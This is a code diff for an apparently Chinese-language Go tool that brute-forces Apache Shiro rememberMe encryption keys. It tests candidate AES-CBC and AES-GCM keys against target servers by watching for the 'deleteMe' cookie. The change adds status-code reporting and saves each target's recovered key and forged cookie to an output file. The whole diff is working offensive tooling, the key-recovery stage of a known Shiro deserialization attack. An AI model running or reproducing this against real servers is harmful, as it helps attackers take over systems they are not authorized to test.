@@ -9,6 +9,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"net/http"
 	"net/url"
 	"os"
@@ -32,7 +33,10 @@ type Shiro struct {
 	Proxy        string
 	Method       string
 	Params       string
+	Output       string
 }
+
+var tmp string
 
 func (s Shiro) httpClient(target string, proxy string, cookie string) (*http.Response, error) {
 	var p *url.URL
@@ -100,27 +104,27 @@ func (s *Shiro) is_Shiro() []string {
 func (s *Shiro) checkTargets() {
 	fmt.Println(color.CyanString("[+]"), "正在对所有目标进行Shiro框架识别")
 	targets := s.is_Shiro()
-	FindShiroKey := func(target string, key string, ver int) (string, string, int, bool) {
+	FindShiroKey := func(target string, key string, ver int) (string, string, int, int, bool) {
 		var rememberMe string
 		var err error
 		if ver == 1 {
 			rememberMe, err = s.AesGCMEncrypt(key)
 			if err != nil {
-				return "", "", -1, false
+				return "", "", -1, -1, false
 			}
 		} else {
 			rememberMe, err = s.AesCBCEncrypt(key)
 			if err != nil {
-				return "", "", -1, false
+				return "", "", -1, -1, false
 			}
 		}
 		resp, err := s.httpClient(target, s.Proxy, rememberMe)
 		if err != nil {
-			return "", "", -1, false
+			return "", "", -1, -1, false
 		}
 		for _, sc := range s.FilterStatus {
 			if sc == resp.StatusCode {
-				return "", "", -1, false
+				return "", "", -1, -1, false
 			}
 		}
 		defer resp.Body.Close()
@@ -130,9 +134,9 @@ func (s *Shiro) checkTargets() {
 		}
 
 		if !strings.Contains(cookies, s.RememberMe+"=deleteMe") {
-			return target, s.RememberMe + "=" + rememberMe, ver, true
+			return target, s.RememberMe + "=" + rememberMe, ver, resp.StatusCode, true
 		}
-		return "", "", -1, false
+		return "", "", -1, -1, false
 	}
 
 	var mutex = sync.Mutex{}
@@ -147,17 +151,19 @@ func (s *Shiro) checkTargets() {
 			target := t[0]
 			key := t[1]
 			ver, _ := strconv.Atoi(t[2])
-			_, cookie, _, is := FindShiroKey(target, key, ver)
+			_, cookie, _, statusCode, is := FindShiroKey(target, key, ver)
 			if is == true {
 				mutex.Lock()
 				if ver == 1 {
-					fmt.Println(color.RedString("[+]"), target+"--GCM-key:"+key)
+					fmt.Println(color.RedString("[+]"), target+"--GCM-key:"+key, "响应状态码:", statusCode)
 					fmt.Println(cookie)
 					s.status[target] = true
+					tmp += fmt.Sprintln("目标：", target, "\n响应状态码：", statusCode, "\nGCM-key: ", key, "\n"+cookie+"\n\n")
 				} else {
-					fmt.Println(color.RedString("[+]"), target+"--CBC-key:"+key)
+					fmt.Println(color.RedString("[+]"), target+"--CBC-key:"+key, "响应状态码:", statusCode)
 					fmt.Println(cookie)
 					s.status[target] = true
+					tmp += fmt.Sprintln("目标：", target, "\n响应状态码：", statusCode, "\nCBC-key: ", key, "\n"+cookie+"\n\n")
 				}
 				mutex.Unlock()
 			}
@@ -186,7 +192,12 @@ func (s *Shiro) checkTargets() {
 		_ = p.Invoke(target)
 	}
 	wg.Wait()
+	err := ioutil.WriteFile(s.Output, []byte(tmp), 0644)
+	if err != nil {
+		fmt.Println(err)
+	}
 	fmt.Println(color.CyanString("[+]"), "全部目标爆破完成")
+	fmt.Println(color.CyanString("[+]"),"输出结果保存在",s.Output)
 }
 
 func (s Shiro) AesCBCEncrypt(k string) (string, error) {
